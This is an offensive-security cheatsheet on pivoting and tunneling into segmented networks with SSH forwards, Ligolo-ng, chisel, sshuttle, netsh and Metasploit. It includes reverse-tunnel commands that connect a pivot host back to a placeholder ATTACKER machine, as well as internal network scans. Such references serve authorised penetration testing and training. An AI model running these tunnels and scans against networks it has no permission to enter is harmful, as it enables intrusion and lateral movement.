# Cheatsheet · Pivoting & Tunneling

> Reach segmented networks. On each new host: `ip route; ip addr; arp -a; cat /etc/hosts`. Keep a written pivot map.

## SSH (no upload needed if creds exist)
```bash
# Local forward: reach REMOTE:445 at 127.0.0.1:4445
ssh -L 4445:10.2.0.5:445 user@PIVOT
# Dynamic SOCKS proxy on :9050
ssh -D 9050 user@PIVOT
# Reverse forward: expose attacker svc on the pivot
ssh -R 9001:127.0.0.1:9001 user@PIVOT
# Background + no shell
ssh -fN -D 9050 user@PIVOT
```
`/etc/proxychains4.conf`:
```
[ProxyList]
socks5 127.0.0.1 9050
```
Use it (SOCKS = full-connect scans only):
```bash
proxychains nmap -sT -Pn -p- 10.2.0.0/24
proxychains curl http://10.2.0.10:9090 -I
proxychains nxc smb 10.2.0.0/24
```

## Ligolo-ng (recommended for multi-hop)
```bash
# Attacker: create tun + start proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                                  # listens :11601
# On pivot (agent):
./agent -connect ATTACKER:11601 -ignore-cert
# In proxy console:
session            # select the agent
start              # start the tunnel
# Attacker: route the remote subnet through ligolo
sudo ip route add 10.2.0.0/24 dev ligolo
# Now tools hit 10.2.0.0/24 natively (no proxychains):
nmap -sT 10.2.0.0/24
# Double pivot: run a second agent on a host in 10.2.0.0/24,
# add a listener/route for the next subnet (e.g., 10.3.0.0/24).
```

## chisel (SOCKS over HTTP — web-only egress)
```bash
# Attacker (server, reverse)
./chisel server -p 8080 --reverse
# Pivot (client) -> reverse SOCKS back to attacker :1080
./chisel client ATTACKER:8080 R:socks
proxychains nmap -sT -Pn 10.2.0.0/24
# Single-port forward variant
./chisel client ATTACKER:8080 R:4445:10.2.0.5:445
```

## sshuttle (quick "VPN" over SSH)
```bash
sshuttle -r user@PIVOT 10.2.0.0/24 --dns
```

## Windows pivots
```cmd
:: plink local forward
plink.exe -ssh -L 4445:10.2.0.5:445 user@PIVOT
:: native portproxy
netsh interface portproxy add v4tov4 listenport=4445 connectaddress=10.2.0.5 connectport=445
```

## Metasploit pivot
```text
meterpreter> run autoroute -s 10.2.0.0/24
msf> use auxiliary/server/socks_proxy        # then proxychains
```

## Discover-the-next-subnet one-liners
```bash
ip route ; ip -br addr ; arp -a
for i in $(seq 1 254); do ping -c1 -W1 10.2.0.$i &>/dev/null && echo "10.2.0.$i up"; done
```

## Gotchas
- SOCKS can't do SYN scans → `nmap -sT -Pn` only.
- Lost track? Stop and redraw the pivot map.
- One method stalls (localhost quirks)? Switch SSH↔Ligolo↔chisel.
